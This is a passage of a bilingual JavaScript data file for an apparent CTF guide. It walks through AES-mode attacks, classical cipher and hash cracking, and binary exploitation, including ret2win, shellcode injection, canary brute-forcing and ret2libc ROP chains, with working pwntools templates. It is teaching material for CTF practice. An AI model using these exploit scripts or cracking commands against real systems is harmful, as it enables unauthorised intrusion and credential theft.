      { label: "Retour RSA", label_en: "Back to RSA", next: "crypto_rsa", icon: "🔑" },
      { label: "Retour crypto général", label_en: "Back to general crypto", next: "crypto", icon: "🔐" }
    ]
  },

  // ── SYMÉTRIQUE (AES modes) ────────────────────────────────────────────────────
  "crypto_symmetric": {
    id: "crypto_symmetric", title: "Crypto Symétrique — AES & Stream Ciphers", title_en: "Symmetric Crypto — AES & Stream Ciphers", category: "ctf", icon: "🔒",
    description: "Mauvais usage des modes AES en CTF : ECB (pattern leakage / cut-and-paste), CBC (padding oracle, bit-flipping), CTR/GCM (nonce reuse → keystream recovery), CBC-MAC forgery. XOR keystream reuse.",
    description_en: "Misuse of AES modes in CTF: ECB (pattern leakage / cut-and-paste), CBC (padding oracle, bit-flipping), CTR/GCM (nonce reuse → keystream recovery), CBC-MAC forgery. XOR keystream reuse.",
    commands: [
      { label: "ECB — détecter et exploiter", label_en: "ECB — detect and exploit", cmd: "# Détection : même blocs plaintext → même blocs ciphertext\n# Envoyer du texte répété (ex: 64 'A') et chercher des blocs identiques\npython3 << 'EOF'\nfrom Crypto.Cipher import AES\nimport base64\n\nciphertext = base64.b64decode('CIPHERTEXT_B64')\nblocks = [ciphertext[i:i+16] for i in range(0, len(ciphertext), 16)]\n# Chercher des blocs identiques\nif len(blocks) != len(set(blocks)):\n    print('ECB détecté !')\nEOF\n\n# Exploitation : cut-and-paste de blocs\n# Ex: aligner 'admin' sur un bloc, récupérer le ciphertext, l'insérer ailleurs" },
      { label: "CBC — Padding Oracle (PadBuster)", label_en: "CBC — Padding Oracle (PadBuster)", cmd: "# Oracle : le serveur révèle si le padding PKCS#7 est valide\n# -> déchiffrement sans la clé, ou forge de ciphertext\n\n# PadBuster :\nperl ./padBuster.pl http://target.ctf/page 'CIPHERTEXT_B64' 16 \\\n    -encoding 0 -cookies 'login=CIPHERTEXT_B64'\n# -encoding 0 = Base64\n# -error 'Invalid' si l'oracle est un message d'erreur spécifique\n\n# Ou manuellement en Python :\n# Modifier C[i-1] byte par byte et observer la réponse serveur" },
      { label: "CBC — Bit-flipping (modifier plaintext sans clé)", label_en: "CBC — Bit-flipping (modify plaintext without the key)", cmd: "# Cible : P[i+1] = D(C[i+1]) XOR C[i]\n# Modifier C[i] flip les bits de P[i+1] à position précise\npython3 << 'EOF'\n# Ex : changer 'user' en 'admin' dans P[i+1]\n# Si 'user' est au byte offset j dans P[i+1] :\noriginal = b'user'\ntarget   = b'admi'  # ajuster\nciphertext = bytearray(bytes.fromhex('CIPHERTEXT_HEX'))\nblock_before = 0  # index du bloc C[i] (0-indexed, en octets : block_before*16)\nfor k in range(len(original)):\n    ciphertext[block_before * 16 + OFFSET + k] ^= original[k] ^ target[k]\nprint(bytes(ciphertext).hex())\nEOF" },
      { label: "CTR / GCM — Nonce Reuse (keystream recovery)", label_en: "CTR / GCM — Nonce Reuse (keystream recovery)", cmd: "# C = P XOR keystream\n# Si même key+nonce : C1 XOR C2 = P1 XOR P2\n# Avec plaintext connu (en partie) :\npython3 << 'EOF'\nc1 = bytes.fromhex('CIPHER1_HEX')\nc2 = bytes.fromhex('CIPHER2_HEX')\nknown_p1 = b'connu...'\n\n# Récupérer le keystream depuis le plaintext connu\nkeystream = bytes([c ^ p for c, p in zip(c1, known_p1)])\n\n# Déchiffrer c2 avec le keystream récupéré\ndecrypted = bytes([c ^ k for c, k in zip(c2, keystream)])\nprint(decrypted)\nEOF\n\n# XOR cracker online : https://wiremask.eu/tools/xor-cracker/" },
      { label: "Hash Length Extension (MD5/SHA1/SHA256)", label_en: "Hash Length Extension (MD5/SHA1/SHA256)", cmd: "# sig = HASH(secret || message)\n# -> forger sig pour message || padding || append\n\n# hash_extender :\nhash_extender --data 'message' --secret-length 16 \\\n    --append '&admin=true' --signature SIG --format sha256\n\n# hashpump :\nhashpump -s SIG -d 'message' -a '&admin=true' -k 16\n\n# Note : ne fonctionne PAS sur HMAC (HMAC est conçu pour résister à ça)" },
      { label: "CBC-MAC forgery (messages de longueur variable)", label_en: "CBC-MAC forgery (variable-length messages)", cmd: "# CBC-MAC avec IV=0 est vulnérable pour messages variable length\n# Si tag1 = CBCMAC(key, m1) est connu :\n# Forger tag pour m1 || padding || m2 :\n# tag2 = CBCMAC(key, m2 XOR tag1 prefix)\n# -> m2 commence par (first_block_of_m2 XOR tag1)\npython3 << 'EOF'\ntag1 = bytes.fromhex('TAG1_HEX')\nm2_first_block = b'votre message 2'[:16]\nforged_start = bytes([a ^ b for a, b in zip(m2_first_block, tag1)])\n# envoyer : m1 || PKCS7_padding || forged_start || reste_de_m2\nEOF" }
    ],
    lookfor: [
      "Cookie/token qui ne change pas si même user → ECB (IV fixe ou ECB pur)",
      "Blocs identiques dans le ciphertext → ECB détecté",
      "Erreur différente pour padding invalide vs. valeur invalide → padding oracle",
      "Deux ciphertexts chiffrés avec même nonce CTR → C1 XOR C2 = P1 XOR P2",
      "Signature construite comme HASH(secret || msg) → length extension",
      "HMAC : résistant à la length extension (ne pas confondre)"
    ],
    lookfor_en: [
      "Cookie/token that does not change for the same user → ECB (fixed IV or pure ECB)",
      "Identical blocks in the ciphertext → ECB detected",
      "Different error for invalid padding vs. invalid value → padding oracle",
      "Two ciphertexts encrypted with the same CTR nonce → C1 XOR C2 = P1 XOR P2",
      "Signature built as HASH(secret || msg) → length extension",
      "HMAC: resistant to length extension (do not confuse)"
    ],
    tips: [
      "PadBuster (github.com/AonCyberLabs/PadBuster) automatise l'attaque padding oracle CBC",
      "CTR nonce reuse : les structures de données prédictibles (JSON, ASN.1) donnent un grand plaintext connu",
      "ECB cut-and-paste : si le format est field1|field2 et on peut choisir field1, aligner 'admin' sur un bloc",
      "GCM : nonce reuse compromise AUSSI l'intégrité (forge possible avec plusieurs (C,tag) sous même nonce)"
    ],
    tips_en: [
      "PadBuster (github.com/AonCyberLabs/PadBuster) automates the CBC padding oracle attack",
      "CTR nonce reuse: predictable data structures (JSON, ASN.1) provide a large known plaintext",
      "ECB cut-and-paste: if the format is field1|field2 and you control field1, align 'admin' on a block",
      "GCM: nonce reuse also compromises integrity (forgery possible with multiple (C,tag) under the same nonce)"
    ],
    choices: [
      { label: "Déchiffré / forgé → flag !", label_en: "Decrypted / forged → flag!", next: "flag_found", icon: "🏁" },
      { label: "Retour crypto général", label_en: "Back to general crypto", next: "crypto", icon: "🔐" }
    ]
  },

  // ── CRYPTO CLASSIQUE ──────────────────────────────────────────────────────────
  "crypto_classical": {
    id: "crypto_classical", title: "Chiffrements Classiques CTF", title_en: "Classical Ciphers CTF", category: "ctf", icon: "📜",
    description: "Chiffrements historiques et encodages fréquents en CTF : Vigenère, substitution, XOR, OTP réutilisé, Bacon, Morse, encodages multi-couches (Base64/32/85). Identifier la couche d'abord, puis peler.",
    description_en: "Historical ciphers and common encodings in CTF: Vigenère, substitution, XOR, reused OTP, Bacon, Morse, multi-layer encodings (Base64/32/85). Identify the layer first, then peel it off.",
    commands: [
      { label: "Identifier le chiffrement / l'encodage", label_en: "Identify the cipher / encoding", cmd: "# Identification automatique :\nCiphey -t 'CIPHERTEXT'  # https://github.com/Ciphey/Ciphey\ncodext 'CIPHERTEXT'     # https://github.com/dhondta/python-codext\n\n# Sites :\n# CyberChef 'Magic' : https://gchq.github.io/CyberChef/\n# dCode identifier : https://www.dcode.fr/cipher-identifier\n# Boxentriq : https://www.boxentriq.com/code-breaking/cipher-identifier\n\n# Indices visuels :\n# Base64 : A-Za-z0-9+/= (padding =)\n# Base32 : A-Z2-7= (beaucoup de = en fin)\n# Ascii85/Base85 : dense ponctuation, parfois <~ ... ~>\n# Uniquement A-Z maj : chiffrement classique probable\n# Longueur fixe hex : hash (MD5=32, SHA1=40, SHA256=64)" },
      { label: "Vigenère — déchiffrer la clé", label_en: "Vigenère — recover the key", cmd: "# Outils en ligne :\n# https://www.dcode.fr/vigenere-cipher\n# https://www.guballa.de/vigenere-solver (attaque automatique sans clé)\n\n# En Python avec pycipher :\npython3 -c \"\nfrom pycipher import Vigenere\nprint(Vigenere('CLE').decipher('CIPHERTEXT'))\n\"" },
      { label: "XOR — analyse de fréquence (clé courte)", label_en: "XOR — frequency analysis (short key)", cmd: "# Clé 1 byte :\npython3 << 'EOF'\nciphertext = bytes.fromhex('HEXCIPHERTEXT')\nfor k in range(256):\n    decrypted = bytes([b ^ k for b in ciphertext])\n    if all(32 <= c < 127 for c in decrypted):\n        print(f'Key {k}: {decrypted}')\nEOF\n\n# Clé multi-byte : xortool\nxortool -x -l 8 cipher.bin\n\n# XOR cracker online : https://wiremask.eu/tools/xor-cracker/" },
      { label: "OTP réutilisé (crib dragging)", label_en: "Reused OTP (crib dragging)", cmd: "# c1 XOR c2 = m1 XOR m2 -> attaque crib drag\npython3 << 'EOF'\nc1 = bytes.fromhex('CIPHER1')\nc2 = bytes.fromhex('CIPHER2')\nxored = bytes([a ^ b for a, b in zip(c1, c2)])\n# Tester des cribs (mots connus : 'the ', 'flag{', ' and ')\ncrib = b'the '\nfor i in range(len(xored) - len(crib)):\n    res = bytes([xored[i+j] ^ crib[j] for j in range(len(crib))])\n    if all(32 <= b < 127 for b in res):\n        print(f'offset {i}: {res}')\nEOF" },
      { label: "Bacon, Morse, Runes, encodages ésotériques", label_en: "Bacon, Morse, Runes, esoteric encodings", cmd: "# Bacon (groupes de 5 lettres A/B ou 0/1) :\n# https://www.dcode.fr/bacon-cipher\n\n# Morse :\n# .... --- .-.. -.-. .- .-. .- -.-. --- .-.. .-\n# Auto-break : Nayuki https://www.nayuki.io/page/automatic-caesar-cipher-breaker-javascript\n\n# Runes / Futhark : chercher 'futhark cipher' et mapper les tables\n\n# Multi-base encoder/decoder :\n# https://github.com/mufeedvh/basecrack\n# basecrack -s 'STRING' ou -f file.txt" },
      { label: "Hachage — identification + crackage", label_en: "Hashing — identification + cracking", cmd: "# Identifier :\nhashid HASH\nhashcat --example-hashes | grep -i '<pattern>'\n\n# Online lookups :\n# crackstation.net, hashes.org, md5decrypt.net, gpuhash.me\n\n# Hashcat local :\nhashcat -m 0   hash.txt /usr/share/wordlists/rockyou.txt  # MD5\nhashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt  # SHA1\nhashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt # SHA256\nhashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt # bcrypt\n\n# John the Ripper :\njohn --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hash.txt" },
      { label: "Fernet, Shamir, OpenSSL salted", label_en: "Fernet, Shamir, OpenSSL salted", cmd: "# Fernet (deux strings Base64 : token + key)\nfrom cryptography.fernet import Fernet\nf = Fernet(KEY_B64)\nprint(f.decrypt(TOKEN_B64))\n# Decode helper : https://asecuritysite.com/encryption/ferdecode\n\n# Shamir Secret Sharing (t shares, seuil t) :\n# Online : http://christian.gen.co/secrets/\n\n# OpenSSL salted (commence par 'Salted__') :\n# Brute force : https://github.com/glv2/bruteforce-salted-openssl\n# https://github.com/carlospolop/easy_BFopensslCTF" },
      { label: "CyberChef — magie automatique multi-couches", label_en: "CyberChef — automatic multi-layer magic", cmd: "# 1. gchq.github.io/CyberChef\n# 2. Coller le ciphertext\n# 3. Operation 'Magic' (profondeur 5-10) → détection automatique des couches\n# 4. Raw Deflate / Raw Inflate pour données compressées\n# 5. Compression : gzip=1f8b, zlib=78xx, zip=504b, bzip2=425a68, xz=fd377a585a00\n\n# Zlib python :\npython3 -c \"\nimport sys, zlib\ndata = open('file.bin','rb').read()\nfor wb in [15, -15]:\n    try: print(zlib.decompress(data, wbits=wb)[:200])\n    except: pass\n\"" }
    ],
    lookfor: [
      "Longueur fixe hex → hash (MD5=32, SHA1=40, SHA256=64 chars)",
      "Seulement A-Z majuscules → chiffrement classique (Caesar, Vigenère, substitution)",
      "Base64/32/85/58 → décoder d'abord avant d'analyser le contenu",
      "Deux ciphertexts de même longueur → OTP réutilisé (XOR les deux)",
      "Groupes de 5 lettres A/B → Bacon cipher",
      "Magic bytes 1f8b, 504b, 78xx → compression imbriquée"
    ],
    lookfor_en: [
      "Fixed-length hex → hash (MD5=32, SHA1=40, SHA256=64 chars)",
      "Uppercase A-Z only → classical cipher (Caesar, Vigenère, substitution)",
      "Base64/32/85/58 → decode first before analyzing content",
      "Two ciphertexts of equal length → reused OTP (XOR the two)",
      "Groups of 5 A/B letters → Bacon cipher",
      "Magic bytes 1f8b, 504b, 78xx → nested compression"
    ],
    tips: [
      "Ciphey (github.com/Ciphey/Ciphey) tente automatiquement des dizaines d'encodages et chiffrements",
      "dcode.fr est la référence absolue pour les chiffrements classiques avec solveurs automatiques",
      "quipqiup.com résout les substitutions monoalphabétiques automatiquement",
      "CyberChef 'Magic' avec profondeur 10+ détecte les encodages imbriqués (base64 dans base32 dans gzip...)",
      "crackstation.net craque souvent les hashes CTF non-salés en quelques secondes"
    ],
    tips_en: [
      "Ciphey (github.com/Ciphey/Ciphey) automatically tries dozens of encodings and ciphers",
      "dcode.fr is the definitive reference for classical ciphers with automatic solvers",
      "quipqiup.com solves monoalphabetic substitutions automatically",
      "CyberChef 'Magic' with depth 10+ detects nested encodings (base64 inside base32 inside gzip...)",
      "crackstation.net often cracks unsalted CTF hashes within seconds"
    ],
    choices: [
      { label: "Message décodé → flag !", label_en: "Message decoded → flag!", next: "flag_found", icon: "🏁" },
      { label: "RSA ou crypto asymétrique → attaques RSA", label_en: "RSA or asymmetric crypto → RSA attacks", next: "crypto_rsa", icon: "🔑" },
      { label: "AES / stream cipher → symétrique", label_en: "AES / stream cipher → symmetric", next: "crypto_symmetric", icon: "🔒" }
    ]
  },

  // ── BINARY EXPLOITATION ───────────────────────────────────────────────────────
  "binary_exploit": {
    id: "binary_exploit", title: "Binary Exploitation — Point d'Entrée", title_en: "Binary Exploitation — Entry Point", category: "ctf", icon: "💣",
    description: "Introduction aux challenges pwn : identifier le type de vulnérabilité, les protections actives (NX/PIE/canary/RELRO), et choisir la technique d'exploitation. Toujours commencer par checksec + file + strings + Ghidra.",
    description_en: "Introduction to pwn challenges: identify the vulnerability type, active protections (NX/PIE/canary/RELRO), and choose the exploitation technique. Always start with checksec + file + strings + Ghidra.",
    commands: [
      { label: "Analyser le binaire et ses protections", label_en: "Analyze the binary and its protections", cmd: "file binary\nchecksec --file=binary\n# ou : rabin2 -I binary\n\n# Protections :\n# NX : stack non-exécutable (shellcode impossible si actif)\n# PIE : Position Independent Executable (ASLR full -> besoin leak)\n# Canary : Stack canary (overflow nécessite bypass)\n# RELRO : Read-Only Relocations (partial = GOT overwrite ok, full = non)\n\n# Vérifier seccomp :\nseccomp-tools dump ./binary\n\n# Architecture :\nreadelf -h binary | grep 'Class\\|Machine'" },
      { label: "Analyser avec GDB + pwndbg/GEF", label_en: "Analyze with GDB + pwndbg/GEF", cmd: "gdb ./binary\n# Avec pwndbg ou GEF installé :\n(gdb) checksec\n(gdb) info functions     # liste des fonctions\n(gdb) disas main\n(gdb) run < input\n\n# GEF :\n(gdb) heap             # état du heap\n(gdb) search-pattern AAAA  # chercher un pattern" },
      { label: "Décompiler avec Ghidra", label_en: "Decompile with Ghidra", cmd: "# 1. Lancer Ghidra > New Project > Import binary\n# 2. Double-clic > Analyze (tout par défaut)\n# 3. Functions > main > voir le pseudocode C\n# Chercher : gets(), strcpy(), scanf('%s'), sprintf(), printf(buf)\n# Chercher aussi : system(), win(), flag(), shell()\n\n# Alternative : radare2\nr2 -A binary\naaa   # analyser\nafl   # lister fonctions\npdf @ main  # désassembler main" },
      { label: "Chercher les fonctions dangereuses", label_en: "Search for dangerous functions", cmd: "objdump -d binary | grep -A5 '<gets\\|<strcpy\\|<sprintf\\|<scanf'\nreadelf -s binary | grep -i 'gets\\|strcpy\\|system\\|win\\|flag'\nstrings binary | grep -i 'flag\\|cat\\|/bin/sh\\|win\\|shell'\n\n# rabin2 (radare2) :\nrabin2 -z binary   # strings\nrabin2 -s binary   # symbols" },
      { label: "Environnement pwntools", label_en: "pwntools environment setup", cmd: "pip install pwntools\npython3 << 'EOF'\nfrom pwn import *\n\n# Setup context\ncontext.arch = 'amd64'  # ou 'i386'\ncontext.log_level = 'debug'  # verbose\n\n# Local :\np = process('./binary')\n# Remote :\np = remote('challenge.ctf.com', 1337)\n# Debug GDB :\np = gdb.debug('./binary', 'break main')\n\nbinary = ELF('./binary')\nlibc   = ELF('./libc.so.6')  # si fournie\nEOF" }
    ],
    lookfor: [
      "gets(), strcpy(), scanf(\"%s\") → buffer overflow quasi-garanti",
      "printf(user_input) sans format → format string vulnerability",
      "malloc/free avec données utilisateur → heap overflow ou UAF",
      "Absence de NX → shellcode injection possible",
      "Absence de canary → overflow sans contournement canary",
      "Fonction win(), flag() ou shell() dans les symboles → ret2win direct",
      "seccomp bpf → restrictions sur les syscalls (pas execve → open+read+write)"
    ],
    lookfor_en: [
      "gets(), strcpy(), scanf(\"%s\") → buffer overflow almost guaranteed",
      "printf(user_input) without format → format string vulnerability",
      "malloc/free with user-controlled data → heap overflow or UAF",
      "No NX → shellcode injection possible",
      "No canary → overflow without canary bypass",
      "Function win(), flag() or shell() in symbols → direct ret2win",
      "seccomp bpf → syscall restrictions (no execve → open+read+write)"
    ],
    tips: [
      "Commencer toujours par checksec + file + strings avant d'ouvrir GDB",
      "Ghidra révèle souvent la vulnérabilité en quelques minutes de lecture du pseudocode C",
      "pwntools est incontournable : gère connexions, packing, ROP chains (ELF + ROP())",
      "Chercher une fonction win() ou flag() → le challenge est probablement ret2win simple",
      "Nightmare (guyinatuxedo.github.io) : référence gold standard pour pwn binaire C"
    ],
    tips_en: [
      "Always start with checksec + file + strings before opening GDB",
      "Ghidra often reveals the vulnerability within minutes of reading the C pseudocode",
      "pwntools is essential: handles connections, packing, ROP chains (ELF + ROP())",
      "Look for a win() or flag() function → the challenge is probably a simple ret2win",
      "Nightmare (guyinatuxedo.github.io): gold standard reference for binary pwn in C"
    ],
    choices: [
      { label: "Buffer overflow stack (gets/strcpy) → ret2win ou shellcode", label_en: "Stack buffer overflow (gets/strcpy) → ret2win or shellcode", next: "bof_basic", icon: "💥" },
      { label: "Format string printf vulnérable", label_en: "Vulnerable printf format string", next: "format_string_vuln", icon: "📝" },
      { label: "ROP chain nécessaire (NX actif, pas de win())", label_en: "ROP chain required (NX active, no win())", next: "rop_chain", icon: "⛓️" },
      { label: "Heap corruption (malloc/free)", label_en: "Heap corruption (malloc/free)", next: "heap_exploit", icon: "🗑️" }
    ]
  },

  "bof_basic": {
    id: "bof_basic", title: "Buffer Overflow Stack — Ret2Win", title_en: "Stack Buffer Overflow — Ret2Win", category: "ctf", icon: "💥",
    description: "Stack buffer overflow : trouver l'offset vers EIP/RIP avec cyclic(), écraser le return address pour sauter vers win() ou injecter un shellcode (si NX désactivé). Bypass canary si nécessaire.",
    description_en: "Stack buffer overflow: find the offset to EIP/RIP with cyclic(), overwrite the return address to jump to win() or inject shellcode (if NX disabled). Bypass canary if needed.",
    commands: [
      { label: "Trouver l'offset avec cyclic (pwntools)", label_en: "Find offset with cyclic (pwntools)", cmd: "python3 << 'EOF'\nfrom pwn import *\n# Générer un pattern de 200 bytes\npattern = cyclic(200)\nprint(pattern)\nEOF\n\n# Lancer avec le pattern :\n# run < <(python3 -c \"from pwn import *; import sys; sys.stdout.buffer.write(cyclic(200))\")\n# Dans GDB pwndbg après segfault :\n# cyclic_find(0x61616164)  # -> donne l'offset\n\n# Ou : pwn cyclic 200 et pwn cyclic -l 0xVALEUR" },
      { label: "Trouver l'offset avec msf-pattern (alternative)", label_en: "Find offset with msf-pattern (alternative)", cmd: "/usr/bin/msf-pattern_create -l 200 > pattern.txt\ncat pattern.txt | ./binary\n# Puis sur la valeur de EIP/RIP au crash :\n/usr/bin/msf-pattern_offset -q 0x61413361\n\n# Avec dmesg si pas de GDB :\ndmesg | tail | grep segfault\npwn cyclic -l 0x<errorLocation>" },
      { label: "Ret2Win — écraser RIP vers win()", label_en: "Ret2Win — overwrite RIP to win()", cmd: "python3 << 'EOF'\nfrom pwn import *\nbinary = ELF('./binary')\np = process('./binary')\n# ou : p = remote('ctf.com', 1337)\n\nwin_addr = binary.symbols['win']  # ou 'flag' ou 'shell'\nprint(f'win() @ {hex(win_addr)}')\n\noffset = 40  # offset trouvé avec cyclic\n# 64-bit : p64() | 32-bit : p32()\npayload = b'A' * offset + p64(win_addr)\np.sendline(payload)\np.interactive()\nEOF" },
      { label: "Shellcode injection (NX désactivé)", label_en: "Shellcode injection (NX disabled)", cmd: "python3 << 'EOF'\nfrom pwn import *\ncontext.arch = 'amd64'  # ou 'i386'\np = process('./binary')\n\n# Shellcode pwntools\nshellcode = asm(shellcraft.sh())\nprint(f'shellcode length: {len(shellcode)}')\n\n# shellcode alternatifs : http://shell-storm.org/shellcode/\n\n# Adresse du buffer (via GDB : p &buf ou info frame)\nbuf_addr = 0xffffd000\noffset = 40\npayload = shellcode + b'A' * (offset - len(shellcode)) + p64(buf_addr)\np.sendline(payload)\np.interactive()\nEOF" },
      { label: "Bruteforce canary statique (forked binary)", label_en: "Brute-force static canary (forked binary)", cmd: "# Si canary est statique (fork ou challenge intro) :\npython3 << 'EOF'\nfrom pwn import *\nimport string\n\nbinary = ELF('./vuln')\nalphabet = string.printable\n\ncanary = ''\nfor i in range(1, 5):  # 4 bytes pour 32-bit\n    for letter in alphabet:\n        p = binary.process()\n        p.recv()\n        p.sendline(str(32 + i))\n        p.recv()\n        p.sendline(b'A' * 32 + canary.encode() + letter.encode())\n        prompt = p.recv().decode(errors='replace')\n        if 'Stack' not in prompt:\n            canary += letter\n            break\n        p.close()\nprint('Canary:', canary)\nEOF" },
      { label: "Contourner canary via leak", label_en: "Bypass canary via leak", cmd: "python3 << 'EOF'\nfrom pwn import *\np = process('./binary')\ncanary_offset = 104  # offset jusqu'au canary (trouver avec GDB)\nrip_offset = 136     # offset total jusqu'à RIP\n\n# 1. Leak du canary via format string ou read partielle\n# Le canary en x64 finit toujours par \\x00 (null byte)\n\n# 2. Reconstruire le payload avec canary correct\ncanary = 0x<valeur_leakée>\nwin_addr = 0x<win_address>\n\npayload = b'A'*canary_offset + p64(canary) + b'B'*8 + p64(win_addr)\np.sendline(payload)\np.interactive()\nEOF\n\n# Note : __stack_chk_fail dans GOT -> possible de GOT overwrite\n# Si canary mal overwrite : appel à __stack_chk_fail\n# Modifier GOT[__stack_chk_fail] -> win() pour contourner" }
    ],
    lookfor: [
      "Segfault avec grande entrée → buffer overflow confirmé",
      "RIP/EIP contrôlé (valeur 0x41414141 ou pattern cyclic) → offset à trouver",
      "Fonction win(), flag(), shell() dans les symboles → ret2win",
      "NX disabled → shellcode injection possible (shellcraft.sh())",
      "Stack canary : trouver offset du canary en GDB (mov rax, QWORD PTR fs:0x28)"
    ],
    lookfor_en: [
      "Segfault with large input → buffer overflow confirmed",
      "Controlled RIP/EIP (value 0x41414141 or cyclic pattern) → find the offset",
      "Function win(), flag(), shell() in symbols → ret2win",
      "NX disabled → shellcode injection possible (shellcraft.sh())",
      "Stack canary: find canary offset in GDB (mov rax, QWORD PTR fs:0x28)"
    ],
    tips: [
      "cyclic() + cyclic_find() de pwntools est la méthode la plus rapide pour l'offset",
      "En 64-bit : p64() ; en 32-bit : p32() — pwntools auto-détecte avec context.arch",
      "Canary en x64 : toujours 8 bytes, le premier byte est toujours \\x00",
      "Si PIE actif : les adresses changent à chaque run → besoin d'un leak d'adresse → ROP",
      "GEF, pwndbg ou PEDA rendent GDB beaucoup plus lisible pour le pwn"
    ],
    tips_en: [
      "cyclic() + cyclic_find() from pwntools is the fastest method for finding the offset",
      "64-bit: p64(); 32-bit: p32() — pwntools auto-detects with context.arch",
      "x64 canary: always 8 bytes, the first byte is always \\x00",
      "If PIE is active: addresses change each run → need an address leak → ROP",
      "GEF, pwndbg or PEDA make GDB much more readable for pwn"
    ],
    choices: [
      { label: "Shell obtenu → flag !", label_en: "Shell obtained → flag!", next: "flag_found", icon: "🏁" },
      { label: "PIE actif → besoin d'un leak d'adresse → ROP", label_en: "PIE active → need address leak → ROP", next: "rop_chain", icon: "⛓️" },
      { label: "Retour au choix d'exploitation", label_en: "Back to exploitation choice", next: "binary_exploit", icon: "💣" }
    ]
  },

  "rop_chain": {
    id: "rop_chain", title: "ROP Chain & Ret2Libc", title_en: "ROP Chain & Ret2Libc", category: "ctf", icon: "⛓️",
    description: "Return-Oriented Programming : chaîner des gadgets pour contourner NX. Ret2libc appelle system('/bin/sh') via des gadgets existants. En 64-bit : aligner la stack sur 16 bytes avant system().",
    description_en: "Return-Oriented Programming: chain gadgets to bypass NX. Ret2libc calls system('/bin/sh') via existing gadgets. In 64-bit: align the stack to 16 bytes before system().",
    commands: [
      { label: "Trouver des gadgets avec ROPgadget", label_en: "Find gadgets with ROPgadget", cmd: "ROPgadget --binary binary --rop | grep 'pop rdi ; ret'\nROPgadget --binary binary --string '/bin/sh'\nROPgadget --binary binary --rop > gadgets.txt\n# Génération automatique de ROP chain :\nROPgadget --ropchain --binary binary" },
      { label: "Trouver des gadgets avec ropper / ropr", label_en: "Find gadgets with ropper / ropr", cmd: "ropper -f binary\nropper -f binary --search 'pop rdi'\nropper -f binary --chain 'execve'\n\n# ropr (alternative rapide) :\nropr -f binary | grep 'pop rdi'" },
      { label: "Ret2libc 64-bit — leak ASLR puis system('/bin/sh')", label_en: "Ret2libc 64-bit — leak ASLR then system('/bin/sh')", cmd: "python3 << 'EOF'\nfrom pwn import *\nbinary = ELF('./binary')\nlibc   = ELF('/lib/x86_64-linux-gnu/libc.so.6')\np = process('./binary')\n\n# Gadgets\npop_rdi = 0x401234    # ROPgadget: 'pop rdi ; ret'\nret_gadget = 0x40101a # ROPgadget: 'ret' (alignement stack 16 bytes)\n\noffset = 40\n\n# Étape 1 : Leak puts@got via puts(puts_got) -> adresse libc\nputs_plt = binary.plt['puts']\nputs_got = binary.got['puts']\nmain_addr = binary.symbols['main']\n\npayload1 = b'A'*offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)\np.sendline(payload1)\np.recvline()\nleaked_puts = u64(p.recv(6).ljust(8, b'\\x00'))\nlibc_base = leaked_puts - libc.symbols['puts']\nprint(f'libc base: {hex(libc_base)}')\n\n# Étape 2 : system('/bin/sh')\nsystem_addr = libc_base + libc.symbols['system']\nbinsh_addr  = libc_base + next(libc.search(b'/bin/sh'))\n\npayload2 = b'A'*offset + p64(ret_gadget) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)\np.sendline(payload2)\np.interactive()\nEOF" },
      { label: "pwntools ROP automatique", label_en: "pwntools automatic ROP", cmd: "python3 << 'EOF'\nfrom pwn import *\nbinary = ELF('./binary')\nlibc   = ELF('./libc.so.6')\np = process('./binary')\n\nrop = ROP(binary)\nrop.puts(binary.got['puts'])\nrop.main()\nprint(rop.dump())\n\npayload = b'A'*40 + rop.chain()\np.sendline(payload)\nEOF" },
      { label: "one_gadget — execve('/bin/sh') en un gadget libc", label_en: "one_gadget — execve('/bin/sh') in a single libc gadget", cmd: "# Trouver des gadgets execve('bin/sh') dans libc :\none_gadget /lib/x86_64-linux-gnu/libc.so.6\n\n# Depuis Python :\nimport os\nlibc_loc = os.popen('ldd ./binary').read().split('\\n')[1].strip().split()[2]\ngadgets = [int(l.split()[0], 16) for l in os.popen(f'one_gadget {libc_loc}').read().split('\\n') if 'execve' in l]\nprint(gadgets)" },
      { label: "Identifier la libc (depuis adresses leakées)", label_en: "Identify the libc (from leaked addresses)", cmd: "# libc-database : chercher libc depuis offset leaked\n# https://libc.blukat.me/ ou https://libc.rip/\n# Entrer : function name + 3 derniers nibbles de l'adresse leakée\n\n# Identifier libc locale :\nldd ./binary\nldd ./binary | grep libc" }
    ],
    lookfor: [
      "NX activé → shellcode impossible → gadgets nécessaires",
      "PIE désactivé → adresses PLT/GOT fixes → ret2plt possible sans leak",
      "Gadget 'pop rdi ; ret' pour contrôler le premier argument (64-bit calling convention)",
      "Gadget 'ret' seul → alignement stack 16 bytes (requis par system() en 64-bit Ubuntu)",
      "Chaine '/bin/sh' dans le binaire ou dans libc → évite de la stocker soi-même"
    ],
    lookfor_en: [
      "NX active → shellcode impossible → gadgets required",
      "PIE disabled → PLT/GOT addresses fixed → ret2plt possible without leak",
      "Gadget 'pop rdi ; ret' to control the first argument (64-bit calling convention)",
      "Solo 'ret' gadget → 16-byte stack alignment (required by system() on 64-bit Ubuntu)",
      "'/bin/sh' string in the binary or libc → avoids storing it yourself"
    ],
    tips: [
      "En 64-bit : stack DOIT être alignée sur 16 bytes avant system() → ajouter un gadget 'ret'",
      "one_gadget trouve des gadgets execve('/bin/sh') libc en une seule instruction",
      "ROPEmporium (ropemporium.com) : challenges dédiés ROP de niveau basique à avancé",
      "libc-database ou libc.rip : identifier la libc depuis des offsets leakés en remote"
    ],
    tips_en: [
      "In 64-bit: stack MUST be 16-byte aligned before system() → add a 'ret' gadget",
      "one_gadget finds single-instruction execve('/bin/sh') gadgets in libc",
      "ROPEmporium (ropemporium.com): dedicated ROP challenges from basic to advanced",
      "libc-database or libc.rip: identify the libc from leaked offsets in remote challenges"
    ],
    choices: [
      { label: "Shell obtenu → flag !", label_en: "Shell obtained → flag!", next: "flag_found", icon: "🏁" },
      { label: "Retour à binary exploitation", label_en: "Back to binary exploitation", next: "binary_exploit", icon: "💣" }
    ]
  },

  "format_string_vuln": {
    id: "format_string_vuln", title: "Format String Vulnerability", title_en: "Format String Vulnerability", category: "ctf", icon: "📝",
    description: "printf(user_input) sans format string → lecture et écriture arbitraire en mémoire. %p pour leaker des adresses (canary, libc), %n pour écrire (GOT overwrite). fmtstr_payload() de pwntools automatise l'écriture.",
